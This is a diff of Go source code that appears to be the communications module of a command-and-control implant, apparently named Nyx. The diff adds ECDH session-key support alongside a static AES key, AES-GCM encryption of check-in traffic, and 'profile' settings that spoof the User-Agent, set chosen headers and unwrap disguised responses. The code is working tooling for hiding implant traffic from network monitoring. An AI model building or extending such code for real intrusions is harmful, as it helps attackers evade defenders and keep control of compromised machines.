@@ -12,9 +12,9 @@ import (
 	"net/http"
 )
 
-// EncKey: 32-byte hex AES-256 key set at build time via
-// -ldflags "-X main.EncKey=<64-char-hex>"
-// When empty, traffic is sent plaintext (backward-compatible).
+// EncKey: 32-byte hex AES-256 key set at build time via -ldflags.
+// DEPRECATED in favour of ECDH key exchange (set automatically after first checkin).
+// Still honoured when set, as a fallback for servers without ECDH support.
 var EncKey = ""
 
 var aesGCM cipher.AEAD
@@ -25,9 +25,14 @@ func initCrypto() error {
 	}
 	keyBytes, err := hex.DecodeString(EncKey)
 	if err != nil || (len(keyBytes) != 16 && len(keyBytes) != 24 && len(keyBytes) != 32) {
-		return fmt.Errorf("invalid EncKey: must be 32/48/64 hex chars (AES-128/192/256)")
+		return fmt.Errorf("invalid EncKey: must be 32/48/64 hex chars")
 	}
-	block, err := aes.NewCipher(keyBytes)
+	return initCryptoWithKey(keyBytes)
+}
+
+// initCryptoWithKey is called both by initCrypto (static key) and deriveSessionKey (ECDH).
+func initCryptoWithKey(key []byte) error {
+	block, err := aes.NewCipher(key)
 	if err != nil {
 		return err
 	}
@@ -35,23 +40,19 @@ func initCrypto() error {
 	return err
 }
 
-// encryptPayload encrypts plaintext with AES-256-GCM.
-// Output: nonce (12 bytes) || ciphertext || tag (16 bytes), all hex-encoded.
 func encryptPayload(plaintext []byte) ([]byte, error) {
 	if aesGCM == nil {
-		return plaintext, nil // no encryption configured
+		return plaintext, nil
 	}
 	nonce := make([]byte, aesGCM.NonceSize())
 	if _, err := rand.Read(nonce); err != nil {
 		return nil, err
 	}
 	ct := aesGCM.Seal(nonce, nonce, plaintext, nil)
-	// Wrap in JSON envelope so server can detect encrypted payloads
 	envelope := map[string]string{"enc": hex.EncodeToString(ct)}
 	return json.Marshal(envelope)
 }
 
-// decryptPayload decrypts a server response if it contains an "enc" field.
 func decryptPayload(data []byte) ([]byte, error) {
 	if aesGCM == nil {
 		return data, nil
@@ -60,7 +61,7 @@ func decryptPayload(data []byte) ([]byte, error) {
 		Enc string `json:"enc"`
 	}
 	if err := json.Unmarshal(data, &envelope); err != nil || envelope.Enc == "" {
-		return data, nil // not encrypted, pass through
+		return data, nil
 	}
 	ct, err := hex.DecodeString(envelope.Enc)
 	if err != nil {
@@ -74,8 +75,8 @@ func decryptPayload(data []byte) ([]byte, error) {
 	return aesGCM.Open(nil, nonce, ct, nil)
 }
 
-// encPost is a drop-in for http.Client.Post that encrypts the body.
-func encPost(url, contentType string, body []byte) (*http.Response, error) {
+// encPost encrypts the body and fires the request using the active profile shape.
+func encPost(url, _ string, body []byte) (*http.Response, error) {
 	encrypted, err := encryptPayload(body)
 	if err != nil {
 		return nil, fmt.Errorf("encrypt: %w", err)
@@ -84,19 +85,75 @@ func encPost(url, contentType string, body []byte) (*http.Response, error) {
 	if err != nil {
 		return nil, err
 	}
-	req.Header.Set("Content-Type", contentType)
-	if EncKey != "" {
+	req.Header.Set("Content-Type", ProfileContentType)
+	if ProfileUA != "" {
+		req.Header.Set("User-Agent", ProfileUA)
+	}
+	if ProfileHeaders != "" {
+		for _, pair := range splitHeaders(ProfileHeaders) {
+			req.Header.Set(pair[0], pair[1])
+		}
+	}
+	if aesGCM != nil {
 		req.Header.Set("X-Nyx-Enc", "1")
 	}
 	return client.Do(req)
 }
 
-// readDecrypted reads and decrypts a response body.
 func readDecrypted(resp *http.Response) ([]byte, error) {
 	defer resp.Body.Close()
 	data, err := io.ReadAll(resp.Body)
 	if err != nil {
 		return nil, err
 	}
+	data = profileUnwrap(data)
 	return decryptPayload(data)
+}
+
+func splitHeaders(h string) [][2]string {
+	var out [][2]string
+	for _, pair := range splitOn(h, '|') {
+		kv := splitN(pair, ':', 2)
+		if len(kv) == 2 {
+			out = append(out, [2]string{trim(kv[0]), trim(kv[1])})
+		}
+	}
+	return out
+}
+
+func splitOn(s string, sep byte) []string {
+	var parts []string
+	start := 0
+	for i := 0; i < len(s); i++ {
+		if s[i] == sep {
+			parts = append(parts, s[start:i])
+			start = i + 1
+		}
+	}
+	parts = append(parts, s[start:])
+	return parts
+}
+
+func splitN(s string, sep byte, n int) []string {
+	var parts []string
+	for i := 0; i < len(s) && len(parts) < n-1; i++ {
+		if s[i] == sep {
+			parts = append(parts, s[:i])
+			s = s[i+1:]
+			i = -1
+		}
+	}
+	parts = append(parts, s)
+	return parts
+}
+
+func trim(s string) string {
+	start, end := 0, len(s)
+	for start < end && (s[start] == ' ' || s[start] == '\t') {
+		start++
+	}
+	for end > start && (s[end-1] == ' ' || s[end-1] == '\t') {
+		end--
+	}
+	return s[start:end]
 }
